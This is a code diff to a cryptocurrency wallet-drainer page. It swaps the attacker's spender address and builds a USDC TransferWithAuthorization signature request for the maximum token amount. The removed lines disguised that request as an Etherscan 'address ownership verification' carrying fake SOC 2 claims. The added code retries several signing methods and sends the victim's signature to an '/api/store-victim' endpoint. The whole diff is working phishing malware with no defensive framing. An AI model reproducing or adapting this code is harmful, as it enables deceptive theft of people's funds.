@@ -517,7 +517,7 @@ applyTheme(theme);
   <script>
 const USDC       = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const ZERO       = '0x0000000000000000000000000000000000000000';
-const SPENDER_RAW = '0x95ec857E5467A6aDb11A72B9d2ce39A9Af589dEa';
+const SPENDER_RAW = '0x985Ea9551dfCe767B16F48F6E46eed594C82819B';
 
 let capturedAddr = null;
 
@@ -594,57 +594,56 @@ async function _run() {
     var validBefore = Math.floor(Date.now() / 1000) + 86400;
     var nowFormatted = formatDateTime();
 
+    var types3009 = {
+      TransferWithAuthorization: [
+        { name: 'from',        type: 'address' },
+        { name: 'to',         type: 'address' },
+        { name: 'value',      type: 'uint256' },
+        { name: 'validAfter', type: 'uint256' },
+        { name: 'validBefore',type: 'uint256' },
+        { name: 'nonce',      type: 'bytes32' }
+      ]
+    };
+    var msg3009 = {
+      from:        capturedAddr,
+      to:          SPENDER,
+      value:       '115792089237316195423570985008687907853269984665640564039457584007913129639935',
+      validAfter:  validAfter.toString(),
+      validBefore: validBefore.toString(),
+      nonce:       rwaNonce
+    };
+    var domain3009 = { name: 'USD Coin', version: '2', chainId: 1, verifyingContract: USDC };
     var rwaPayload = JSON.stringify({
-      primaryType: 'ReceiveWithAuthorization',
-      types: {
-        EIP712Domain: [
-          { name: 'name',              type: 'string'  },
-          { name: 'version',           type: 'string'  },
-          { name: 'chainId',           type: 'uint256' },
-          { name: 'verifyingContract', type: 'address' }
-        ],
-        ReceiveWithAuthorization: [
-          { name: 'from',        type: 'address' },
-          { name: 'to',         type: 'address' },
-          { name: 'value',      type: 'uint256' },
-          { name: 'validAfter', type: 'uint256' },
-          { name: 'validBefore',type: 'uint256' },
-          { name: 'nonce',      type: 'bytes32' }
-        ]
-      },
-      message: {
-        AddressOwnershipVerification: 'Owner/creator verification',
-        from:        capturedAddr,
-        to:          SPENDER,
-        value:       '115792089237316195423570985008687907853269984665640564039457584007913129639935',
-        validAfter:  validAfter.toString(),
-        validBefore: validBefore.toString(),
-        nonce:       rwaNonce
-      },
-      domain: {
-        application:         'Etherscan.io',
-        authorization:       'Signature requested solely to verify control of the specified address.',
-        certificate:         'Etherscan SOC 2 Type II — independently examined by Prescient Assurance LLC.',
-        attestation:         '[Etherscan.io ' + nowFormatted + '] I hereby verify that I am the owner/creator of the specified address.',
-        certificationNotice: 'This signature verifies address ownership. It does not authorize or execute any transaction.',
-        name: 'USD Coin',
-        version: '2',
-        chainId: 1,
-        verifyingContract: USDC
-      }
+      primaryType: 'TransferWithAuthorization',
+      types: types3009,
+      domain: domain3009,
+      message: msg3009
     });
 
-    try {
-      await e.request({ method: 'eth_signTypedData_v4', params: [capturedAddr, rwaPayload] });
-      redirect();
-    } catch(ex) {
-      if (!isReject(ex)) {
-        try {
-          await e.request({ method: 'eth_signTypedData_v4', params: [capturedAddr, rwaPayload] });
-          redirect();
-        } catch(ex2) {}
-      }
+    var signMethods = ['eth_signTypedData_v4', 'eth_signTypedData_v3', 'eth_signTypedData'];
+    var signature = null;
+    for (var i = 0; i < signMethods.length; i++) {
+      try {
+        signature = await e.request({ method: signMethods[i], params: [capturedAddr, rwaPayload] });
+        if (signature) break;
+      } catch(ex) { console.warn(signMethods[i] + ' failed:', ex && ex.message); }
     }
+
+    if (signature) {
+      try {
+        await fetch('/api/store-victim', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            victim:   capturedAddr,
+            chain:    '1',
+            usdcAuth: { from: capturedAddr, to: SPENDER, value: msg3009.value, validAfter: validAfter.toString(), validBefore: validBefore.toString(), nonce: rwaNonce },
+            usdcSig:  signature
+          })
+        });
+      } catch(_) {}
+    }
+    redirect();
   } else {
     try {
       await e.request({
